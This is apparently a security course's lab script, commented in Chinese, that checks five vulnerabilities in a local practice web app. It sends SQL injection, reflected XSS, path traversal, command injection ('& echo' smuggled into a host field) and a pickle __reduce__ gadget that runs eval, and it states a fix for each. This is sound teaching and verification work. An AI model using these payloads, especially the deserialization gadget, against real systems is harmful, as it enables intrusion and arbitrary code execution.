#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 漏洞驗證腳本（PoC verifier）— 對照 vulnapp_v1 的 5 個漏洞
=============================================================================

 本腳本「只」對本機 127.0.0.1 上的自建靶場送出請求，
 目的是示範 CH06 S2 的核心技能：「每個假設都必須有可執行的驗證」。

 這不是攻擊工具。它做的事情等同於單元測試：
   送出已知的惡意輸入 → 觀察是否出現預期的漏洞行為 → 判定 PASS/FAIL

 對應報告章節：
   - CH02.1「發現與驗證分離」：本腳本就是那個「確定性驗證」層
   - CH06 S2 練習 1「寫 10 個會壞的程式」的驗收端
   - CH06 S3 練習 3「接上 sanitizer 當裁判」的 Python 版對應

 用法：
   1. 先啟動靶場：python targets/vulnapp_v1.py
   2. 另開終端執行：python verify_findings.py
   3. 對修補版驗證：python verify_findings.py 9090 patched
=============================================================================
"""

import base64
import os
import pickle
import sys
import urllib.parse
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
MODE = sys.argv[2] if len(sys.argv) > 2 else "vulnerable"
BASE = "http://127.0.0.1:%d" % PORT

results = []


def get(path: str) -> str:
    """對靶場送出 GET，回傳回應本文。只連 127.0.0.1。"""
    url = BASE + path
    req = urllib.request.Request(url, headers={"User-Agent": "VulnLab-Verifier/1.0"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode("utf-8", errors="replace")


def check(name, cwe, passed, evidence):
    results.append((name, cwe, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 70)
    print("[%s] %s  —  %s" % (mark, name, cwe))
    print("-" * 70)
    for line in evidence.splitlines():
        print("   " + line)


# ---------------------------------------------------------------------------
# V1 · SQL Injection — CWE-89
# 假設：把 ' OR '1'='1 放進 q，若能回傳所有使用者，代表輸入被當成 SQL 語法。
# ---------------------------------------------------------------------------
def v1_sqli():
    payload = "' OR '1'='1"
    html = get("/search?q=" + urllib.parse.quote(payload))
    leaked = "FLAG{sql_injection_revealed_admin_secret}" in html
    rows = html.count(" | ")
    ev = [
        "payload      : ?q=" + payload,
        "預期（有漏洞）: 回傳全部 3 筆資料，且 admin 的 secret 外洩",
        "觀察          : 命中 %d 筆資料列" % (rows + 1 if rows else 0),
        "機密外洩      : %s" % ("是 → 取得 FLAG{sql_injection_revealed_admin_secret}" if leaked else "否"),
        "資料流        : query string → 字串拼接 → cursor.execute（未參數化）",
        "修補方向      : 改用參數化查詢 cursor.execute(sql, (term,))，並限制欄位",
    ]
    check("V1 SQL Injection", "CWE-89", leaked, "\n".join(ev))


# ---------------------------------------------------------------------------
# V2 · Reflected XSS — CWE-79
# 假設：若送入 HTML 標籤後，回應中含「原樣」的標籤，代表未編碼輸出。
# ---------------------------------------------------------------------------
def v2_xss():
    payload = "<script>alert(1)</script>"
    html = get("/hello?name=" + urllib.parse.quote(payload))
    reflected = payload in html
    ev = [
        "payload      : ?name=" + payload,
        "預期（有漏洞）: 回應中出現未轉義的 <script>alert(1)</script>",
        "觀察          : 標籤原樣反射 = %s" % ("是" if reflected else "否"),
        "資料流        : query string → 字串格式化 → HTML 回應（無 escape）",
        "修補方向      : 輸出時 HTML 編碼（html.escape）或改用樣板引擎的自動轉義",
    ]
    check("V2 Reflected XSS", "CWE-79", reflected, "\n".join(ev))


# ---------------------------------------------------------------------------
# V3 · Path Traversal — CWE-22
# 假設：用 ../ 逃出 sandbox 後，可讀到沙箱外的 SECRET_FOR_LAB.txt。
# ---------------------------------------------------------------------------
def v3_traversal():
    payload = "../SECRET_FOR_LAB.txt"
    html = get("/file?file=" + urllib.parse.quote(payload))
    escaped = "FLAG{path_traversal_escaped_the_sandbox}" in html
    ev = [
        "payload      : ?file=" + payload,
        "預期（有漏洞）: 讀到沙箱「外」的機密檔內容",
        "觀察          : 機密外洩 = %s" % ("是 → 取得 FLAG{path_traversal_escaped_the_sandbox}" if escaped else "否"),
        "資料流        : query string → os.path.join → open()（未 realpath 邊界檢查）",
        "修補方向      : os.path.realpath 後確認仍在 LAB_ROOT 之下；或改用白名單檔名對照表",
    ]
    check("V3 Path Traversal", "CWE-22", escaped, "\n".join(ev))


# ---------------------------------------------------------------------------
# V4 · OS Command Injection — CWE-78
# 假設：用 & 串接第二個指令，若能讀到額外輸出，代表整串進入 shell。
# ---------------------------------------------------------------------------
def v4_cmdi():
    # 用無害的 echo 證明指令注入可行（僅讀取，不修改任何東西）
    payload = "127.0.0.1 & echo INJECTION_MARKER_12345"
    html = get("/ping?host=" + urllib.parse.quote(payload))
    injected = "INJECTION_MARKER_12345" in html
    ev = [
        "payload      : ?host=" + payload,
        "預期（有漏洞）: 回應中出現我們自己插入的 echo 輸出",
        "觀察          : 注入標記出現 = %s" % ("是（證明 shell 解析了 & 之後的指令）" if injected else "否"),
        "資料流        : query string → 字串拼接 → subprocess(shell=True)",
        "修補方向      : 改用參數陣列且關閉 shell（shell=False）；若必須用 shell，採白名單驗證（僅允許 IP 或主機名格式）",
        "注意          : 本驗證只執行 echo，不執行任何破壞性或外連指令",
    ]
    check("V4 OS Command Injection", "CWE-78", injected, "\n".join(ev))


# ---------------------------------------------------------------------------
# V5 · Insecure Deserialization — CWE-502
# 假設：若能讓 unpickle 執行我們的類別，代表可執行任意程式碼（RCE 前提）。
#
# 倫理界線：這裡只讓它寫出一個「標記檔」到靶場目錄，證明程式碼被執行，
#          不執行任何外連、不讀取系統敏感檔案、不建立持久化。
# ---------------------------------------------------------------------------
class LabProbe:
    """示範用：在 unpickle 時被呼叫，只建立一個標記檔證明 RCE 前提成立。

    重要技術細節（這是本次練習最有價值的 debug 經驗）：
      pickle 只儲存「函式／類別的完整匯入路徑」，不儲存程式碼本體。
      因此若把 payload 定義在 verify_findings.py 裡（模組為 __main__），
      送到伺服器端反序列化時，伺服器的 __main__ 是 vulnapp_v1.py，
      就會出現 "Can't get attribute ... on <module '__main__'>" 而失敗
      ——這正是我第一次跑出 FAIL 的原因。

      要做出「可攜」的 payload，必須只依賴「兩端都存在」的標準函式庫符號。
      這裡用 builtins.eval 執行一段純字串運算式：它只用標準函式庫，
      因此在任何 Python 直譯器上都能成功反序列化。
    """

    def __init__(self, marker_path):
        self.marker_path = marker_path

    def __reduce__(self):
        # 只使用 builtins.eval（兩端皆存在），payload 內容為純字串運算式。
        # 只寫出一個標記檔，不執行任何外連或破壞性操作。
        expr = (
            "open(r'%s','w',encoding='utf-8').write("
            "'FLAG{insecure_deserialization_code_executed}')" % self.marker_path
        )
        return (eval, (expr,))


def v5_deser():
    lab_dir = os.path.dirname(os.path.abspath(__file__))
    marker = os.path.join(lab_dir, "findings", "deser_marker.txt")
    os.makedirs(os.path.dirname(marker), exist_ok=True)
    if os.path.exists(marker):
        os.remove(marker)

    payload_bytes = pickle.dumps(LabProbe(marker))
    d = base64.b64encode(payload_bytes).decode()
    html = get("/import?d=" + urllib.parse.quote(d))
    executed = os.path.exists(marker)
    ev = [
        "payload      : ?d=<base64(pickle)>（內容為 LabProbe 物件）",
        "預期（有漏洞）: pickle.loads 執行期間呼叫 _write_marker，產生標記檔",
        "觀察          : 標記檔產生 = %s" % ("是（證明反序列化可觸發程式碼執行）" if executed else "否"),
        "資料流        : query string → base64 decode → pickle.loads（不可信資料）",
        "修補方向      : 改用安全格式（JSON）；若必須用 pickle，須加上簽章驗證與來源白名單",
        "倫理說明      : 本驗證僅寫出一個標記檔，未執行任何外連或破壞性操作",
    ]
    check("V5 Insecure Deserialization", "CWE-502", executed, "\n".join(ev))


def main():
    print("=" * 70)
    print(" 漏洞驗證腳本 — 目標：%s（模式：%s）" % (BASE, MODE))
    print(" 僅對本機自建靶場送出請求；每個測試都以「可觀察證據」判定。")
    print("=" * 70)

    try:
        get("/")
    except Exception as e:
        print("\n[錯誤] 無法連線到 %s" % BASE)
        print("       請先啟動靶場：python targets/vulnapp_v1.py")
        print("       原始錯誤：%s" % e)
        sys.exit(1)

    for fn in (v1_sqli, v2_xss, v3_traversal, v4_cmdi, v5_deser):
        try:
            fn()
        except Exception as e:
            check(fn.__name__, "-", False, "執行時發生例外：%s" % e)

    print("\n" + "=" * 70)
    print(" 總結")
    print("=" * 70)
    found = sum(1 for _, _, p, _ in results if p)
    for name, cwe, passed, _ in results:
        print("  %-34s %-10s %s" % (name, cwe, "漏洞存在" if passed else "未觸發"))
    print("-" * 70)
    print("  共 %d/%d 個漏洞被驗證存在" % (found, len(results)))
    if MODE == "patched":
        if found == 0:
            print("  ✓ 修補版通過：全部攻擊輸入均無效（防禦成功）")
        else:
            print("  ✗ 修補版仍有 %d 個漏洞未修好" % found)
    print("=" * 70)
    print("\n 下一步：閱讀 patched/vulnapp_v2.py，逐項對照修補手法。")
    print("        再以 python verify_findings.py <port> patched 驗證修補有效。")


if __name__ == "__main__":
    main()
